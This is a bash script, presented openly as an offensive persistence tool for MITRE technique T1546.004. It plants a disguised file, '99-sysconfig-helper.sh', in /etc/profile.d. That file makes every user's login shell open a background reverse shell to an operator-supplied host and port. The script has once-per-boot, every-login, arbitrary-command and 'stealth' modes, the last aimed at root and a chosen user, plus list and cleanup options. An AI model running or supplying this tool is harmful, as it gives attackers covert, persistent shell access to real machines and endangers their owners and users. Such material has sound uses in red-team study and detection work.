#!/bin/bash
# /etc/profile.d Script Drop (T1546.004)
# System-wide all-shell persistence: sourced by bash, sh, zsh on ALL login shells

RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; NC='\033[0m'
MARKER="d3m0n_profiled"
SCRIPT_NAME="99-sysconfig-helper.sh"
PROFILED_DIR="/etc/profile.d"

banner() {
    echo -e "${RED}"
    echo " ╔══════════════════════════════════════════════════════╗"
    echo " ║     /etc/profile.d Script Drop (T1546.004)           ║"
    echo " ║  Fires for ALL users on ANY login shell (bash/sh/zsh)║"
    echo " ╚══════════════════════════════════════════════════════╝"
    echo -e "${NC}"
}

install_revshell() {
    local LHOST="$1" LPORT="$2" FREQ="${3:-once}"
    [ -d "$PROFILED_DIR" ] || { echo -e "${RED}[-] ${PROFILED_DIR} not found${NC}"; return; }

    local SCRIPT="${PROFILED_DIR}/${SCRIPT_NAME}"
    [ -f "$SCRIPT" ] && cp "$SCRIPT" "${SCRIPT}.d3m0n.bak"

    if [ "$FREQ" = "once" ]; then
        # Fire once per boot using a lock file
        cat > "$SCRIPT" << EOF
# ${MARKER}
if [ ! -f /tmp/.sc_lock ]; then
    touch /tmp/.sc_lock
    ( nohup /bin/bash -c 'bash -i >& /dev/tcp/${LHOST}/${LPORT} 0>&1' >/dev/null 2>&1 & )
fi
EOF
    else
        # Fire on every login
        cat > "$SCRIPT" << EOF
# ${MARKER}
( nohup /bin/bash -c 'bash -i >& /dev/tcp/${LHOST}/${LPORT} 0>&1' >/dev/null 2>&1 & )
EOF
    fi

    chmod 644 "$SCRIPT"
    echo -e "${GREEN}[+] Installed: ${SCRIPT}${NC}"
    echo -e "${YELLOW}[!] Mode: ${FREQ} — fires on next login of any user${NC}"
    echo -e "${YELLOW}[!] Works with: bash, sh, zsh, ksh, dash login shells${NC}"
}

install_custom() {
    local CMD="$1" FREQ="${2:-always}"
    [ -d "$PROFILED_DIR" ] || { echo -e "${RED}[-] ${PROFILED_DIR} not found${NC}"; return; }

    local SCRIPT="${PROFILED_DIR}/${SCRIPT_NAME}"
    [ -f "$SCRIPT" ] && cp "$SCRIPT" "${SCRIPT}.d3m0n.bak"

    if [ "$FREQ" = "once" ]; then
        cat > "$SCRIPT" << EOF
# ${MARKER}
if [ ! -f /tmp/.sc_lock ]; then
    touch /tmp/.sc_lock
    ( ${CMD} >/dev/null 2>&1 & )
fi
EOF
    else
        cat > "$SCRIPT" << EOF
# ${MARKER}
( ${CMD} >/dev/null 2>&1 & )
EOF
    fi

    chmod 644 "$SCRIPT"
    echo -e "${GREEN}[+] Custom command installed: ${SCRIPT}${NC}"
}

install_stealth() {
    # Extra stealth: source-only if a specific env var or user matches
    local LHOST="$1" LPORT="$2" TARGET_USER="${3:-root}"
    [ -d "$PROFILED_DIR" ] || { echo -e "${RED}[-] ${PROFILED_DIR} not found${NC}"; return; }

    local SCRIPT="${PROFILED_DIR}/${SCRIPT_NAME}"
    cat > "$SCRIPT" << EOF
# ${MARKER}
_d3m0n_u=\$(id -un 2>/dev/null)
if [ "\${_d3m0n_u}" = "${TARGET_USER}" ] || [ "\${_d3m0n_u}" = "root" ]; then
    if [ ! -f /tmp/.sc_lock_\${_d3m0n_u} ]; then
        touch /tmp/.sc_lock_\${_d3m0n_u}
        ( nohup /bin/bash -c 'bash -i >& /dev/tcp/${LHOST}/${LPORT} 0>&1' >/dev/null 2>&1 & )
    fi
fi
unset _d3m0n_u
EOF
    chmod 644 "$SCRIPT"
    echo -e "${GREEN}[+] Stealth profile.d installed (targets: ${TARGET_USER} + root)${NC}"
}

list_installed() {
    echo -e "${YELLOW}[*] Installed scripts:${NC}"
    grep -rl "$MARKER" "$PROFILED_DIR" 2>/dev/null | while read -r f; do
        echo "  ${f}"
        grep -v "^#\|^$" "$f" | head -3 | while read -r l; do echo "    > $l"; done
    done
}

cleanup() {
    echo -e "${YELLOW}[*] Cleaning...${NC}"
    grep -rl "$MARKER" "$PROFILED_DIR" 2>/dev/null | while read -r f; do
        BK="${f%.d3m0n.bak}"
        if [ -f "${f}.d3m0n.bak" ]; then
            mv "${f}.d3m0n.bak" "$f"
            echo -e "${GREEN}[+] Restored: ${f}${NC}"
        else
            rm -f "$f"
            echo -e "${GREEN}[+] Removed: ${f}${NC}"
        fi
    done
    rm -f /tmp/.sc_lock /tmp/.sc_lock_* 2>/dev/null
}

banner
[[ $EUID -ne 0 ]] && { echo -e "${RED}[-] Root required.${NC}"; exit 1; }

echo -e "  ${YELLOW}[1]${NC} Reverse shell (fire once per boot)"
echo -e "  ${YELLOW}[2]${NC} Reverse shell (fire on every login)"
echo -e "  ${YELLOW}[3]${NC} Custom command"
echo -e "  ${YELLOW}[4]${NC} Stealth mode (target specific user)"
echo -e "  ${YELLOW}[5]${NC} List installed"
echo -e "  ${YELLOW}[6]${NC} Cleanup"
echo ""
read -rp "Choice: " OPT

case "$OPT" in
    1)
        read -rp "LHOST: " LHOST; read -rp "LPORT: " LPORT
        install_revshell "$LHOST" "$LPORT" "once"
        ;;
    2)
        read -rp "LHOST: " LHOST; read -rp "LPORT: " LPORT
        install_revshell "$LHOST" "$LPORT" "always"
        ;;
    3)
        read -rp "Command: " CMD
        read -rp "Frequency [once/always]: " FREQ; FREQ="${FREQ:-once}"
        install_custom "$CMD" "$FREQ"
        ;;
    4)
        read -rp "LHOST: " LHOST; read -rp "LPORT: " LPORT
        read -rp "Target user [root]: " USR; USR="${USR:-root}"
        install_stealth "$LHOST" "$LPORT" "$USR"
        ;;
    5) list_installed ;;
    6) cleanup ;;
    *) echo -e "${RED}[-] Invalid option${NC}" ;;
esac
